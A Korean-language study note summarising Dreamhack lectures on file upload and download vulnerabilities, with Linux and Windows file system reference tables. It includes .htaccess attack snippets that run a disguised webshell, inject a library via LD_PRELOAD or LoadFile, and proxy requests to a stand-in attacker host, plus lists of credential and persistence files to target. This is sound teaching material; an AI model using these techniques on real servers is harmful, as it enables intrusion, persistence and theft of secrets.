# Web Hacking: Server-side Advanced - File Vulnerability
🔖 출처
* [Dreamhack Lecture] Server-side Advanced - File Vulnerability [🔗](https://dreamhack.io/lecture/courses/33)
* [Dreamhack Web Hacking Advanced - Server Side] Background: File Vulnerabilities for Linux [🔗](https://dreamhack.io/lecture/courses/282)
* [Dreamhack Web Hacking Advanced - Server Side] Background: File Vulnerabilities for Windows [🔗](https://dreamhack.io/lecture/courses/295)

<br/><br/>

## Overview: File Vulnerability
📌 File Vulnerability Basic [🔗](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/Web%20Hacking:%20Server-side%20Basic.md#file-vulnerability) *← click!*
* File Vulnerability 분류
    | 분류 | 설명 |
    |:---:|------|
    | ***File Upload Vulnerability*** <br/> (파일 업로드 취약점) | 서버의 파일 시스팀에 사용자가 원하는 경로 또는 파일명 등으로 업로드가 가능하여 악영향을 미칠 수<br/> 있는 파일이 업로드되는 취약점 <br/> &nbsp;&nbsp; - 주로 **웹 서비스 관련 파일이 위치한 디렉터리**에 WebShell 등 스크립트를 업로드하여 원하는<br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 코드를 실행하는 데 이용됨 <br/> &nbsp;&nbsp; - 이 외에도 다른 시스템 파일이나 유저 파일을 **변조**하는 데 이용할 수도 있음 |
    | ***File Download Vulnerability*** <br/> (파일 다운로드 취약점) | 서버의 기능 구현 상 의도하지 않은 파일을 다운로드할 수 있는 취약점 <br/> &nbsp;&nbsp; - 주로 웹 서비스의 고객 데이터나 암호화 키 등 **기밀 정보를 유출**하는 데 이용됨 <br/> &nbsp;&nbsp; - 적절한 접근 권한이 있는 경우 시스템의 중요한 정보를 획득하는 것도 가능함 |

<br/><br/><br/>

## 리눅스 파일 시스템
* 웹 서버의 70% 이상에서 사용되는 Unix 계열의 운영체제의 특징
    - *"Everything is a file."* = 장치, 프로세스 등 상당수의 객체들을 파일시스템을 통해 제어할 수 있음 <br/> &nbsp;&nbsp; ***→ ⚠️ 파일 업로드/다운로드 취약점이 발생할 경우 큰 영향을 미칠 수 있음***
    - 디스크 저장 유무로 분류하는 파일의 종류
        + 대부분의 파일들은 디스크 상에 위치하여 문서 등을 저장하는 보관소 역할을 함
        + 실제 저장되지 않고 대신 가상 파일시스템에 위치하여 운영체제의 각종 기능을 제공하는 **가상 파일**도 존재함
<br/>

* 리눅스 파일시스템에 존재하는 디렉터리와 파일들
    - **로그 및 데이터 파일**: 운영체제 및 서비스의 로그와 각종 문서가 저장되는 위치
        | 디랙터리 | 설명 |
        |:---:|------|
        | /var/www | 웹 문서 및 기타 웹 서버에서 사용되는 파일을 저장함 |
        | /var/lib | 시스템의 각종 서비스에서 자료를 저장할 때 사용함 → 데이터베이스 등이 이에 속함 <br/> &nbsp;&nbsp; - ***/var/lib/mysql*** : MySQL 데이터베이스의 데이터가 저장되는 디렉터리 <br/> &nbsp;&nbsp; - ***/var/lib/pgsql*** 또는 ***/var/lib/postgresql*** : PostgreSQL 데이터베이스의 데이터가 저장되는 디렉터리 |
        | /var/log | 시스템 서비스 등의 로그를 저장할 때 사용함 → 웹 서비스의 로그가 보통 여기에 위치함 |
        | /var/cache | 캐시 데이터를 저장함 → 일반적으로 삭제되어도 재생성이 가능함 |
        | /media | 제거 가능한 매체(USB 플래시 메모리, 기타 이동 저장장치 등)을 마운트할 때 주로 사용함 |
        | /mnt | 기타 파일 시스템을 임시로 마운트하는 용도로 주로 사용함 |
    - **설정 파일**: 운영체제 및 서비스를 구성하는 설정 파일
        | 디렉터리 | 설명 |
        |:---:|------|
        | /etc | 운영체제 초기 부팅 시 필요한 최소한의 명령어를 구현하는 프로그램 파일을 저장함 <br/> &nbsp;&nbsp; - ***/etc/apache2*** 또는 ***/etc/httpd*** : Apache Web Server의 설정 정보를 저장하는 디렉터리 <br/> &nbsp;&nbsp; - ***/etc/nginx*** : Nginx 웹 서버의 설정 정보를 저장하는 디렉터리 <br/> &nbsp;&nbsp; - ***/etc/mysql*** : MySQL 데이터베이스 서버의 설정 정보를 저장하는 디렉터리 |
        | /opt/etc | 추가적으로 설치된 프로그램의 설정 정보를 저장함 (존재하지 않을 수도 있음) |

        | 파일 | 설명 |
        |:---:|------|
        | /etc/mysql/my.cnf | MySQL 데이터베이스 서버의 주 설정파일(.cnf) |
        | /etc/passwd, /etc/group | 사용자 및 그룹 정보를 저장함 |
        | /etc/shadow, /etc/gshadow | 사용자 및 그룹의 인증 비밀번호를 암호화하여 저장함 (Shadow Password 정책 사용) <br/> &nbsp;&nbsp; ***→ 일반적으로 관리자 및 권한 있는 프로그램만이 접근할 수 있음*** |
        | /etc/hostname | 현재 시스템의 호스트네임을 저장함 |
        | /etc/hosts | 호스트네임의 실주소를 탐색할 때 사용되는 정적 순람표 |
        | /etc/fstab | 현재 시스템에 등록할 파일시스템의 목록을 저장함 |
    - **프로그램 및 라이브러리**: 프로그램의 명령어가 저장된 위치와 이들을 실행하기 위한 라이브러리의 위치
        | 디렉터리 | 설명 |
        |:---:|------|
        | /bin, /sbin | 운영체제 초기 부팅 시 필요한 최소한의 명령어를 구현하는 프로그램 파일을 저장함 |
        | /boot | 커널이나 부트로더 옵션 등 부팅에 필요한 파일을 저장함 |
        | /lib, /lib64, /libx32, ... | 운영체제 초기 부팅 시 필요한 최소한의 라이브러리 파일을 저장함 |
        | /opt | 추가적인 프로그램을 저장함 |
        | /usr/bin | 각종 명령어 및 프로그램 파일을 저장함 |
        | /usr/sbin | 시스템 관리자가 주로 사용하는 각종 명령어 및 프로그램 파일을 저장함 |
        | /usr/lib, /usr/lib64, /usr/libx32, ... | 시스템에서 공유되는 라이브러리 파일을 저장함 |
        | /usr/share | 기타 파일 시스템에서 공유되는 파일을 저장함 |
    - **장치 및 가상 파일**: 운영체제를 구성하기 위한 파일 (각각의 파일은 커널 기능과 밀접한 연관이 있음)
        | 디렉터리 | 설명 |
        |:---:|------|
        | /dev | 각종 디스크 및 장치 파일을 제공함 |
        | /sys | 하드웨어(주변기기 등) 및 플랫폼에 접근할 수 있도록 함 |
        | /proc | 프로스세 및 시스템 정보를 제공하는 가상 파일 시스템이 위치함 <br/> &nbsp;&nbsp; - ***/proc/sys*** : 운영체제의 동작을 제어할 수 있는 각종 파라미터가 위치하는 디렉터리 <br/> &nbsp;&nbsp; - ***/proc/self/net*** (또는 ***/proc/net***) : 운영체제 네트워크 계층의 다양한 정보를 제공함 |

        | 파일 | 설명 |
        |:---:|------|
        | /dev/null, /dev/zero, /dev/full, <br/> /dev/random, /dev/unrandom | 실제 물리적인 장치를 나타내지는 않지만 자주 사용되는 특수 파일 |
        | /dev/pts | 유사터미널(pseudoterminal) TTY 장치가 위치한 디렉터리 → SSH 터미널 또는 터미널 에물레이터 등에서 <br/>사용됨 |
        | /dev/stdin → /proc/self/fd/0 | 파일 디스크럽터 0, 즉 표준 입력(standard input)에 사용된 파일을 나타내는 심볼릭 링크 |
        | /dev/stdout → /proc/self/fd/1 | 파일 디스크럽터 1, 즉 표준 출력(standard output)에 사용된 파일을 나타내는 심볼릭 링크 |
        | /dev/stderr → /proc/self/fd/2 | 파일 디스크럽터 2, 즉 표준 오류 출력(standard error)에 사용된 파일을 나타내는 심볼릭 링크 |
    - **임시 파일**: 운영 체제 및 서비스에서 사용하는 임시 디렉터리 또는 파일
        | 디렉터리 | 설명 |
        |:---:|------|
        | /tmp | 임시 파일을 저장함 <br/> &nbsp;&nbsp; - 시스템 재시작(재부팅) 시 저장된 파일이 삭제될 수 있으며, 용량에 상당한 제한이 있을 수 있음 <br/> &nbsp;&nbsp; - 디스크 또는 메모리 상(tmpfs, [🔗](https://www.kernel.org/doc/html/latest/filesystems/tmpfs.html))에 존재할 수 있음 |
        | /var/tmp | 임시 파일을 저장함 → 시스템 재시작(재부팅) 시에도 일반적으로 유지됨 |
        | /run (/var/run) | 부팅 후 생성된 각종 런타임 데이터 및 IPC 소켓 등이 이곳에 위치함 → 일반적으로 디스크에 저장되지 않고 메모리 상에서만 존재함(tmpfs) <br/> &nbsp;&nbsp; - ***/var/run/postgresql*** : PostgreSQL 소켓 등이 위치하는 디렉터리 <br/> &nbsp;&nbsp; - ***/var/run/mysql*** : MySQL 소켓 등이 위치하는 디렉터리 |
        | /dev/shm | Linux ```shm_open(3)``` C 라이브러리 함수(shared memory 생성/열기 기능을 수행함)에서 사용됨 <br/> &nbsp;&nbsp; - 일반적으로 디스크에 저장되지 않고 메모리 상에서만 존재함(tmpfs) <br/> &nbsp;&nbsp; - 시스템에 따라 존재하지 않을 수도 있음 |

<br/><br/>

### 파일 업로드 시 공격 지점
* 일반적으로 웹 서비스는 root 권한이 아닌 www-data, nginx, apache와 같은 **일반 계정으로 실행됨**
    - 실행 권힌에 따른 공격 영향
        | 웹 서비스의 실행 권한 | 설명 |
        |:---:|------|
        | root 권한 | 파일 업로드 취약점이 발생했을 때 파일 시스템에 존재하는 대부분의 파일을 덮어쓸 수 있음 |
        | 일반 권한 | 파일 업로드 공격으로부터 피해를 최소화할 수 있음 <br/> ***→ ⚠️ 웹 서버의 파일 시스템 구조를 이해하고 있으면 일반 권한으로 덮어쓸 수 있는 파일을 덮어써서 임의 코드를 실행할 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;수 있음*** |
    - 웹 서비스가 높은 권한으로 실행될 경우 파일 업로드 취약점을 이용한 공격이 용이해짐
    - 시스템 관리자가 웹 서비스와 같은 계정으로 로그인한다면 코드 실행 등의 공격이 가능함

<br/>

* 파일 업르도 취약점 공격 시 이용 가능한 지점
    - Apache Web Server
        + 아파치 웹 서버의 설정 파일
            - 일반적으로 ***/etc/apache2*** 또는 ***/etc/httpd*** 디렉터리에서 관리함
            - 설정 파일 내에서 ```AccessFileName``` 지시어를 사용하면 설정 파일을 분산하여 관리할 수도 있음
                ```Apache
                AccessFileName filename [fileanme ...]
                ```
                + 기본값: ***.htaccess*** 파일 [🔗](https://httpd.apache.org/docs/2.4/en/howto/htaccess.html)
                    ```Apache
                    AccessFileName .htaccess
                    ```
                    - ⚠️ ***.htaccess*** 파일은 **웹 서버의 권한만** 있다면 덮어쓸 수 있음 → ***.htaccess*** 파일을 사용하는 웹 서버에서 파일 업로드 취약점 발생 시 다양한 공격 행위를 수행할 수 있음
                        + 파일 업로드 취약점을 이용하여 ***.htaccess***를 작성한 후 웹 문서 디렉터리에 업로드하면 *.php* 확장자를 우회할 수 있음
                            - 웹셸을 실행하거나 해당 디렉터리 내의 문서를 접근할 때 공격자의 웹 페이지가 접속되는 등 영향을 미치게 됨
                            - ❗️ 웹 마스터가 ```AllowOverride```, ```AllowOverrideList``` 디렉터브에서 허용한 디렉티브만 사용할 수 있음
                    - ```AccessFileName``` 지시어로 설정한 설정 파일에서 모든 설정을 변경할 수 있는 것은 아님
                        + 📌 **```AllowOverride```와 ```AllowOverrideList``` 지시어**를 통해 명시한 지시어만 사용할 수 있음 [🔗](https://httpd.apache.org/docs/2.4/ko/mod/core.html#allowoverride) <br/> &nbsp;&nbsp; → 이를 통해 웹 문서 디렉터리 내에서 특정 파일을 추가적으로 설정 파일로 입력받을 수 있음
        + ***.htaccess*** 파일을 이용한 공격 방법
            - **과정 1**: ***.php*** 확장자 외의 다른 확장자를 PHP 스크립트로 해석하도록 ***.htaccess*** 파일을 작성 (확장자 우회)
                + ```<Files>``` 섹션을 이용한 확장자 우회 예시 [🔗](https://httpd.apache.org/docs/2.4/mod/core.html#files)
                    ```Apache
                    <Files "webshell-dreamhack.jpg">
                        # php-fpm (PHP FastCGI Process Manager)를 사용하는 경우
                        SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"

                        # Apache2 자체 mod_php를 사용하는 경우
                        SetHandler application/x-httpd-php
                    </Files>
                    ```
                    - ```<Files>``` 섹션에 포함된 지시어들은 어떤 디렉터리에 있는지 관계 없이 지정한 이름을 가진 파일에 적용됨 <br/> &nbsp;&nbsp; → 위치와 관계없이 해당 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 처리함
            - **과정 2**: 악의적인 동적 라이브러리를 프로세스에 삽입하여 이를 실행하도록 설정을 변경함
                + 리눅스에서 CGI 스크립트를 사용하는 경우에만 가능함
                + 동적 라이브러리 삽입 시 사용할 수 있는 지시어와 사용 예시
                    | 지시어 | 설명 |
                    |:---:|------|
                    | ```SetEnv``` | CGI 스크립트나 SSI 페이지에 전달할 환경 변수를 설정함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_env.html#setenv) <br/> &nbsp;&nbsp; - ```SetEnv env-variable value``` 형식 |
                    ```Apache
                    SetEnv LD_PRELOAD /var/www/path/to/my/injected/library.so
                    ```
            - **과정 3**: 요청 리다이렉트 → 모든 요청을 공격자의 웹 서버로 전달하도록 설정을 변경함
                + 공격자 서버 리다이렉트 예시
                    ```Apache
                    RewriteEngine On
                    RewriteOptions inherit # 부모의 설정을 상속받음(inherit)

                    # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
                    RewriteRule (.*) fcgi://attacker.example.com.$1 [P]
                    # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
                    RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [P]
                    # HTTP Redirect 적용
                    RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [R=302, L]

                    # 에러 페이지를 공격자의 웹 페이지로 리다이렉트함
                    ErrorDocument 404 https://attacker.example.com/
                    ```
                    | 지시어 | 설명 |
                    |:---:|------|
                    | ```RewriteEngine``` | Runtime Rewriting Engine을 활성화(On) 또는 비활성화(Off)함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_rewrite.html#rewriteengine) |
                    | ```RewriteOptions``` | 현재 서버별 또는 디렉터리별 구성에 대한 일부 특수 옵션을 설정함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_rewrite.html#rewriteoptions) <br/> &nbsp;&nbsp; - ```inherit```, ```AllowAnyURI```, ```MergeBase``` 중 하나만 설정할 수 있음 |
                    | ```RewriteRule``` | Rewrite Engine에 대한 규칙을 정의함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_rewrite.html#rewriterule) <br/> &nbsp;&nbsp; - 형식: ```RewriteRule Pattern Subsitution [flags]``` |
                    | ```ErrorDocument``` | 문제/오류 발생 시 다음 4가지 중 하나를 수행하도록 함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/core.html#errordocument) <br/> &nbsp;&nbsp; - 하드코딩된 간단한 오류 메시지 출력 <br/> &nbsp;&nbsp; - 커스텀한 메시지 출력 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 내부적으로 로컬 URL 경로로 리다이렉션 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 외부 URL로 리다이렉션 |
                + 요청 중에 계정 정보를 포함한 민감한 정보가 포함되어 있다면 이를 또 다른 목적으로 사용할 수 있음
            - **과정 4**: ***/etc/apache2*** 디렉터리 변경이 가능한 경우 업로드한 공유 라이브러리를 로드해 임의 코드 실행이 가능함
                + 변경 사항을 웹 서버에 반영하기 위해서는 **서비스 재시작이 필요함**
                + 공유 라이브러리 예시
                    ```Apache
                    # 서버가 재시작될 때 C:\www\path\injected\library.so을 읽어들여 임의 코드를 실행함
                    LoadFile "C:\www\path\injected\library.so"
                    ```
                    | 지시어 | 설명 |
                    |:---:|------|
                    | ```LoadFile``` | 서버가 시작하거나 재시작할 때 지정한 목적 파일이나 라이브러리를 읽어들임(link in) [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_so.html#loadfile) <br/> &nbsp;&nbsp; - 형식: ```LoadFile filename [filename ...]``` |
    - 일반 권한으로 접근할 수 있는 가상 파일들의 목록 (/proc)
        | 파일 | 설명 |
        |:---:|------|
        | /proc/\<PID\>/coredump_filter | 프로세스 \<PID\>의 코어 덤프에서 포함될 데이터의 범위를 지정함 |
        | /proc/\<PID\>/mem | 프로세스 \<PID\>의 메모리에 접근함 <br/> &nbsp;&nbsp; - 일반적으로 ```fseek```과 같은 하수로 파일 오프셋을 지정하지 않는 이상 사용할 수 없음 |
        | /proc/\<PID\>/comm | 프로세스 \<PID\>의 명칭을 지정함 |
        | /proc/\<PID\>/sched | 프로세스 \<PID\>의 스케쥴링 통계 및 측정에 사용됨 |
        | /proc/\<PID\>/oom_adj, /proc/\<PID\>/oom_score_adj | 시스템 메모리 부족 조건 발생 시 프로세스를 강제 종료시켜 메모리를 확보하게 됨(OOM killer) → 이때 현재 프로세스가 선택되는 우선순위를 조정함 |
        + ***/proc/\<PID\>/*** 대신 ***/proc/self/*** 사용 시 현재 프로세스를 접근하게 됨
        + 파일 업로드 시 파일 존재 여부를 확인한다면 위의 파일은 사용할 수 없음
    - root 사용자 권한이 필요 없는 파일들의 목록
        | 파일 | 설명 |
        |:---:|------|
        | .htaccess | Apache Web Server에서 웹 문서 디렉터리 내 서버 설정을 제어할 수 있음 |
        | ~/.bashrc, ~/.profile | 사용자 로그온 시 실행되는 쉘 명령을 지정함 <br/> &nbsp;&nbsp; - ***~/.profile*** 파일의 경우 관리자가 로그온하는 계정과 웹 서버의 계정이 같을 때만 사용할 수 있음 |
        | ~/.ssh/authorized_keys | 해당 사용자에 로그인할 수 있는 SSH 공개키를 지정함 <br/> &nbsp;&nbsp; - ⚠️ 공격자의 SSH 공개키를 추가하면 공격자가 시스템에 로그인할 수 있음 |
        | ~/.ssh/config | SSH 클라이언트 설정 파일 <br/> &nbsp;&nbsp; - ⚠️ 접속할 호스트 등을 지정하여 악의적인 호스트로 리다이렉트할 수 있음 |
        + ```~```는 ***/home/admin*** 등과 같은 사용자 프로필 디렉터리를 의미함
        + 📌 프로필 및 SSH 키는 관리자가 로그온하는 계정과 웹 서버의 계정이 동일할 때에만 유용함
    - root 권한으로 공격 시 이용할 수 있는 디렉터리 및 파일 목록
        | 디렉터리 | 설명 |
        |:---:|------|
        | /sys/firmware/efi/efivars | EFI 시스템에서 부팅 옵션을 변경할 수 있음 (실제 형식은 EFI 표준에 따라야 함) |
        | /etc/profile.d | 사용자 로그인 시마다 생성되는 명령을 지정하는 스크립트를 저장하는 디렉터리 |
        | /proc, /sys | 루트 권한에서 시스템 제어 시에 사용할 수 있는 가종 파일을 저장함 |

        | 파일 | 설명 |
        |:---:|------|
        | /boot/initramfs-X.Y.Z.img | 부팅 시 초기에 사용되는 파일을 저장한 이미지 파일 <br/> &nbsp;&nbsp; - 부팅 중 시스템 파티션으로 저장되면서 삭제됨 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; → ⚠️ 악성 코드 등이 삽입되면 관리자가 탐지하지 못하는 경우도 있음 |
        | /etc/rc.local | 시스템 부팅 시 실행되는 명령을 지정함 |
        | /etc/crontab | 시스템 부팅 후 주기적으로 실행되는 명령을 지정함 |
        | /etc/profile | 사용자 로그인 시마다 실행되는 명령을 지정함 |
        + 웹 서비스가 **루트 권한으로 작동**하거나 임의의 경로로 **루트 권한을 획득**하는 경우 파일 업로드 취약점으로 시스템을 장악할 수 있음
            - 디렉터리에 새로운 파일을 생성할 수 있음 → 파일 존재 여부 검사 우회 가능

<br/><br/>

### 파일 다운로드 시 공격 지점
* 파일 다운로드 공격은 개인 정보를 포함한 민감한 정보를 수집하는 데 이용할 수 있음
    - 민감한 정보의 예시: 데이터베이스, 운영체제 계정 정보 및 시스템 파일, 방화벽 규칙 정보, 소스 코드 등
        + ***/etc/passwd***: Unix 계열 시스템에서 등록된 사용자 정보를 저장하는 파일 → 웹 서버 공격 시연에서 공격 성공을 보여주기 위해 자주 사용됨
    - ⚠️ 모든 공격은 **서비스를 운용하는 운영체제의 정보를 알아내는 것**으로 시작함 <br/> &nbsp;&nbsp;&nbsp;&nbsp; → 파일 다운로드 취약점이 발생했을 경우 해당 취약점을 이용해 OS의 정보를 수집함

<br/>

* 파일 다운로드 취약점 공격 시 이용 가능한 지점
    - 사용자 권한에서 일반적으로 접근할 수 있는 시스템 가상 파일 및 심볼릭 링크
        | 파일 | 설명 |
        |:---:|------|
        | /proc/cpuinfo | 시스템 CPU 정보를 조회할 수 있음 |
        | /proc/uptime | 시스템의 구동 시간을 조회할 수 있음 |
        | /proc/version | 시스템 커널 버전 정보를 조회할 수 있음 |
        | /proc/self/net/arp (또는 /proc/net/arp) | 내부망에 연결된 호스트들의 정보를 조회할 수 있음 <br/> &nbsp;&nbsp; - 각 IP 주소별 MAC 주소를 출력함 |
        | /proc/self/net/route (또는 /proc/net/route) | 게이트웨어 등 기본 라우팅 테이블을 조회할 수 있음 |
        | /proc/slef/net/tcp (또는 /proc/net/tcp) | 현재 시스템 상에 존재하는 TCP 연결 정보를 조회할 수 있음 |
        | /proc/self/fd/\<FD\> → (FD에 해당하는 파일) <br/> 또는 /dev/fd/\<FD\> → (FD에 해당하는 파일) | 파일 디스크립터 \<FD\>가 가리키는 파일을 나타내는 심볼릭 링크(symbolic link) <br/> &nbsp;&nbsp; -  현재 열린 파일을 조회하고 읽거나 쓸 수 있음 |
        | /proc/self/cmdline, /proc/self/environ | 각각 현재 프로세스의 명령줄(command line) 및 환경 변수(environment Variable)를 <br/>가져옴 <br/> &nbsp;&nbsp; - Docker 등을 사용하는 웹 앱의 경우 암호키나 비밀번호(secret)를 환경변수로 저장하는 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;경우가 많음 *→ ⚠️ 롼경변수를 유출하면 민감 정보를 획득할 수 있음* |
        | /proc/self/exe → (현재 실행 파일) | 현재 프로세스의 실행 파일을 가리키는 심볼릭 링크 |
        | /proc/self/cwd → (현재 디렉터리) | 현재 디렉터리(current working directory)를 가리키는 심볼릭 링크 |
        | /proc/self/maps | 현재 프로세스의 메모리 매핑과 사용 중인 동적 라이브러리의 파일명을 불러옴 |
    - 사용자 권한에서 일반적으로 접근할 수 있는 파일
        | 파일 | 설명 |
        |:---:|------|
        | ~/.bash_history, ~/.zsh_history, ~/.python_history, ... | 사용자가 입력한 쉘 명령 및 인터프리터 명령 기록을 저장함 |
        | ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ... | 사용자의 SSH 비밀키가 위치함 |
        | ~/.gnupg | GNU Privacy Guard 설정 파일 및 비밀키 등이 위치함 |
        | ~/.netrc | FTP 서버 연결 비밀번호 등을 설정하는 파일 |
        | ~/.viminfo | Vim 에디터로 편집한 파일 목록 등이 저장됨 |
        + ```~```은 ***/home/admin***과 같은 사용자 프로필 디렉터리를 의미함
        + 📌 프로필 및 SSH 키 등은 관리자가 로그온하는 계정과 웹 서버의 계정이 동일할 때에만 유용함
    - 서버에서 사용자 접속 기록 등을 저장하는 로그 파일
        | 파일 및 디렉터리 | 설명 |
        |:---:|------|
        | /var/log/apache2 또는 /var/log/httpd | Apache Web Server의 로그가 저장됨 <br/> &nbsp;&nbsp; - 웹 서비스 접속 기록은 ***access.log***에, 에러 기록은 ***error.log***에 저장됨 |
        | /var/log/nginx | Nginx 웹 서버의 로그가 저장됨 |
        | /var/log/php-fpm | FastCGI 기반 PHP 로그가 저장됨 |
        | /var/log/journal | systemd 기반 시스템의 로그가 저장되는 디렉터리 |
        | /var/log/wtmp, <br/> /var/log/btmp, <br/> /var/log/lastlog | 사용자 접속 기록이 저장됨 <br/> &nbsp;&nbsp; - ***wtmp*** : 성공한 로그인/로그아웃 정보를 담고 있는 로그파일 (```last``` 명령어 사용) <br/> &nbsp;&nbsp; - ***btmp*** : 실패한 로그인 정보를 담고 있는 로그 파일 (```lastb``` 명령어 사용) <br/> &nbsp;&nbsp; - ***lastlog*** : 마지막으로 성공한 로그인 정보를 담고 있는 로그 파일 (```lastlog``` 명령어 사용) |

<br/><br/>

### Symbolic Link Traversal
* 업로드 가능한 위치에 심볼릭 링크가 존재하면 ```..```를 사용하여 **업로드 디렉터리와 완전히 다른 곳을 참조**할 수 있음
    - Linux의 심볼릭 링크(Symbolic Link): 특정 파일명을 다른 파일 또는 디렉터리를 가리키도록 할 수 있음
        + 심볼릭 링크 예시
            | 링크 | 예시 |
            |:-----:|-----|
            | ```alice```가 ```bob``` 디렉터리로 링크되어 있음 <br/> (```alice -> bob```) | ```alice/file.tt```는 ```bob/file.txt```로 인식됨 |
    - ⚠️ 심볼링 링크 사용 시 주의할 점
        + 심볼릭 링크에서 ```..``` 디렉터리를 접근하게 되면 심볼릭 링크 자체의 상위 디렉터리가 아니라 **대상 디렉터리의 상위 디렉터리**를 사용함
            - 예시
                | 링크 | 예시 |
                |-----|-----|
                | ```foo/bar -> baz/qux``` | ```foo/bar/..corge```는 ```foo/corge```가 아닌 ```/bax/corge```를 가리키게 됨 <br/> &nbsp;&nbsp; ***⇒ Symbolic Link Traversal***

<br/><br/><br/>

## 윈도우 파일 시스템
* 윈도우(Windows) 운영체제의 특징
    - 기본적으로 마이크로소프트 Internet Information Services(IIS) Server 내장 웹 서버를 제공하고, 아파치 웹 서버와 nginx 등의 소프트웨어를 설치해 사용할 수 있음
    - 과거에 개발된 DOS 프로그램과 유닉스 운영 체제와의 호환성을 위해 **다양한 경로 표기법**이 존재함
        | | 설명 |
        |:---:|------|
        | 장점 | 호환성과 유연한 서비스를 보장하는 프로그램을 개발할 수 있음 |
        | 단점 | 경로 표기 문자 검사를 우회하고 공격할 수 있음 |

<br/>

* 윈도우 파일 시스템의 특징
    - 리눅스와 달리 **드라이브를 지정할 수 없음**
        + 일반적으로 윈도우 구성 파일, 애플리케이션 파일과 같은 중요한 파일은 C 드라이브(***C:***)에 위치함
    - 파일 시스템 접근만으로 시스템 제어가 어려움
        + Unix 계열의 운영체제와 윈도우 운영체제의 비교
            | 운영체제 | 설명 |
            |:---:|------|
            | Unix 계열의 운영체제 | 대부분이 **파일**로 구성되어 있음 → 파일에 접근하는 것만으로도 특정 기능을 수행할 수 있음 |
            | 윈도우 기반의 NT 아키텍처 | - VMS 계열의 운영체제에 영향을 받아 **객체 지향 인터페이스**를 차용하고 있음 <br/> &nbsp;&nbsp;&nbsp;&nbsp; → 기능에 맞는 API를 사용해야 함 <br/> - 시스템 서정의 대부분은 레지스트리를 통해 이루어짐 |

<br/>

* 윈도우 파일시스템에 존재하는 디렉터리와 파일들
    - **로그 및 데이터 파일**: 운영체제 및 서비스의 로그와 각종 문서가 저장되는 위치
        | 디렉터리 | 설명 |
        |:---:|------|
        | C:\inetpub | IIS(Internet Information Services) 서비스에서 웹 문서 및 기타 웹 서버에서 사용되는 파일을 저장함 <br/> &nbsp;&nbsp; - ```C:\inetpub\wwwroot``` : IIS의 웹 문서가 저장되는 기본 경로(디렉터리) |
        | C:\ApacheXY\htdocs, C:\www | Apache Web Server에서 문서 경로로 흔히 사용되는 디렉터리 |
        | C:\Program Files | 각종 프로그램 및 데이터를 저장할 때 사용함 → 데이터베이스 등이 여기에 속함 |
        | C:\ProgramData | 시스템의 각종 서비스에서 자료를 저장할 때 사용함 → 데이터베이스 등이 여기에 속함 <br/> &nbsp;&nbsp; - ```C:\ProgramData\MySQL\MySQL Server X.Y.\Data``` MySQL 데이터베이스의 데이터가 <br/> &nbsp;&nbsp;&nbsp;&nbsp;일반적으로 저장되는 디렉터리 <br/> &nbsp;&nbsp; - ```C:\ProgramData\PostgreSQL\X.Y.\data``` : PostgreSQL 데이터베이스의 데이터가 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 일반적으로 저장되는 디렉터리 |
        | C:\Windows\System32\Winevt\logs | 윈도우 이벤트 로그를 저장할 때 사용함 |
        | C:\Windows\Prefetch | Superfetch 데이터를 저장함 → 최근 사용한 애플리케이션 목록 등을 조회할 수 있음 |
    - **설정 파일**: 운영체제 및 서비스를 구성하는 설정 파일
        | 디렉터리 | 설명 |
        |:---:|------|
        | C:\Windows\System32\config | 시스템 단위 레지스트리 하이브 파일이 저장됨 |
        | C:\Boot | 부팅 관련 파일을 저장함 <br/> &nbsp;&nbsp; - EFI 기반 시스템에서는 EFI 시스템 파티션에 저장됨 |
        | %UserProfile%\Ntuser.dat | ```%UserProfile%``` 프로필 디렉터리를 가진 사용자의 레지스트리가 저장됨 |
        | %UserProfile%\Local Settings\Application<br/> Data\Microsoft\Windows\UsrClass.dat | ```%UserProfile%``` 프로필 디렉터리를 가진 사용자의 확장자 연결 정보 및 COM 클래스 등이<br/> 저장됨 |
        | C:\Windows\drivers\etc | hosts, services와 같은 네트워크 관련 설정 파일이 저장됨 |
        | C:\Program Files\Apache Software<br/> Foundation\Apache\<버전\>\conf | Apache Web Server의 설정 정보를 저장함 |

        | 파일 | 설명 |
        |:---:|------|
        | C:\Boot\BCD | Boot Configuration Data 파일이 위치함 |
        | C:\ProgramData\MySQL\MySQL Server X.Y\my.ini | MySQL 데이터베이스 서버의 주 설정 파일 |
        | C:\Windows\System32\drivers\etc\hosts | 호스트네임의 실주소를 탐색할 때 사용되는 정적 순람표 |
    - **프로그램 및 라이브러리**: 프로그램의 명령어가 저장된 위치와 이들을 실행하기 위한 라이브러리의 위치
        | 디렉터리 | 설명 |
        |:---:|------|
        | C:\Program Files | 각종 프로그램 및 데이터를 저장할 때 사용함 |
        | C:\Windows\System32 | 시스템 파일 및 DLL들이 위치함 |
        | C:\Windows\SysWOW64 | 32비트 호환(Windows-on-Windows) 레이어싱 시스템 파일 및 DLL들이 위치함 |
    - **장치 및 가상 파일**: 운영체제를 구성하기 위한 파일
        | 디렉터리 | 설명 |
        |:---:|------|
        | ```\\:\``` | Win32 장치 파일을 접근하는 경로의 시작을 나타냄 <br/> &nbsp;&nbsp; - ```NUL``` ```CON```와 같은 기본 장치 이름은 시스템 라이브러리에서 자동으로 인식됨 <br/> &nbsp;&nbsp;&nbsp;&nbsp; → ```\\.\```을 사용할 필요가 없음 |
